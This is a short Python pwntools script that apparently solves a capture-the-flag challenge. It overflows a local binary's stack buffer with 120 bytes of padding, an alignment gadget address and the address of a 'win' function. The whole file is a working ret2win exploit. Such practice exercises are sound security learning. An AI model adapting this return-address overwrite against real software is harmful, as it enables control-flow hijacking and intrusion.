from pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

# More funny stack alignment thingies
p.sendline(b"a"*120 + p64(0x00000000004011b4)+ p64(e.sym.win))
p.interactive()
